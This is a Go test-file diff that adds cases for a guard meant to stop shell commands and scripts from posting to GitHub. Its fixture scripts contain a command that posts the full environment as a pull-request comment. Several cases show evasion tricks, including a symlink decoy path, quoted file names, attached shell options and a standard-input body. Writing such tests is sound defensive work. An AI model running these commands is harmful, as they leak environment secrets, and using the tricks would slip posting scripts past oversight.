@@ -290,6 +290,92 @@ func TestGitHubPostGuardReadsAScriptThatNamesAPostThroughTheCreateAlias(t *testi
 	}
 }
 
+// TestGitHubPostGuardReadsTheScriptTheKernelWouldOpen: a name holding .. is resolved against the real
+// directory tree, so a link in the middle of the name is followed before the .. applies. Cleaning the name
+// first would read a different file than the shell opens.
+func TestGitHubPostGuardReadsTheScriptTheKernelWouldOpen(t *testing.T) {
+	githubPostTempHome(t)
+	cwd := t.TempDir()
+	t.Setenv("TMPDIR", cwd)
+	inside := t.TempDir()
+	_ = inside
+	if err := os.MkdirAll(filepath.Join(cwd, "real"), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.MkdirAll(filepath.Join(cwd, "decoy"), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Symlink(filepath.Join(cwd, "real"), filepath.Join(cwd, "decoy", "link")); err != nil {
+		t.Fatal(err)
+	}
+	// decoy/link/../post.sh: the kernel follows decoy/link to cwd/real and its .. to cwd, so it runs
+	// cwd/post.sh (posting). Collapsing the name first would read cwd/decoy/post.sh (the clean decoy).
+	githubPostWrite(t, cwd, "decoy/post.sh", "echo clean\n")
+	githubPostWrite(t, cwd, "post.sh", "gh pr comment 1 -b \"$(env)\"\n")
+	command := "bash decoy/link/../post.sh"
+	githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleUnread, "decoy/link/../post.sh:1")
+}
+
+// TestGitHubPostGuardRefusesAQuotedStandardInputBody: the sentinel is the argument gh receives, so a quoted
+// or attached dash is the same standard-input body, not a file name.
+func TestGitHubPostGuardRefusesAQuotedStandardInputBody(t *testing.T) {
+	githubPostTempHome(t)
+	cwd := t.TempDir()
+	t.Setenv("TMPDIR", cwd)
+	githubPostWrite(t, cwd, "-", "a clean body\n")
+	for _, command := range []string{
+		"gh pr comment 1 --body-file '-'",
+		"gh pr comment 1 --body-file=\"-\"",
+		"gh api repos/o/r/issues/1/comments --input '-'",
+		"gh api repos/o/r/issues/1/comments -F 'body=@-'",
+	} {
+		githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleInline, githubPostWhereCommand)
+	}
+}
+
+// TestGitHubPostGuardReadsAScriptBehindAnAttachedValueOption: o and O take their value from the same word
+// when more of the bundle follows (zsh -ocorrect post.sh), so the next word is the program file and the
+// letters inside the value are not flags.
+func TestGitHubPostGuardReadsAScriptBehindAnAttachedValueOption(t *testing.T) {
+	githubPostTempHome(t)
+	cwd := t.TempDir()
+	t.Setenv("TMPDIR", cwd)
+	githubPostWrite(t, cwd, "post.sh", "gh pr comment 1 -b \"$(env)\"\n")
+	githubPostWrite(t, cwd, "clean.sh", "echo hi\n")
+	for _, command := range []string{
+		"zsh -ocorrect post.sh",
+		"zsh -Oglobdots post.sh",
+		"zsh -oshwordsplit post.sh",
+		"bash -euxo pipefail post.sh",
+	} {
+		githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleUnread, "post.sh:1")
+	}
+	for _, command := range []string{"zsh -ocorrect clean.sh", "bash -euxo pipefail clean.sh"} {
+		githubPostWant(t, githubPostShell(t, cwd, command), command, "", "")
+	}
+}
+
+// TestGitHubPostGuardReadsAScriptBehindAQuotedPathOperand: a quoted operand is the word the shell runs, so
+// quote pieces are not removed twice and a literal close stays in the name.
+func TestGitHubPostGuardReadsAScriptBehindAQuotedPathOperand(t *testing.T) {
+	githubPostTempHome(t)
+	cwd := t.TempDir()
+	t.Setenv("TMPDIR", cwd)
+	githubPostWrite(t, cwd, "'post.sh'", "gh pr comment 1 -b \"$(env)\"\n")
+	githubPostWrite(t, cwd, "post.sh)", "gh pr comment 1 -b \"$(env)\"\n")
+	githubPostWrite(t, cwd, "post.sh", "echo clean\n")
+	for _, c := range []struct{ command, place string }{
+		{"bash \"'post.sh'\"", "'post.sh':1"},
+		{"bash 'post.sh)'", "post.sh):1"},
+	} {
+		githubPostWant(t, githubPostShell(t, cwd, c.command), c.command, githubPostRuleUnread, c.place)
+	}
+	// The controls: a quoted plain name runs the clean file, and an unquoted one is the clean file too.
+	for _, command := range []string{"bash 'post.sh'", "bash post.sh", "(bash post.sh)"} {
+		githubPostWant(t, githubPostShell(t, cwd, command), command, "", "")
+	}
+}
+
 // TestGitHubPostGuardRefusesAStandardInputBody: gh api's standard-input bodies are refused as
 // inline-github-body at command, explicitly, even when a readable file named "-" sits under the payload's
 // working directory, which the guard would otherwise read.
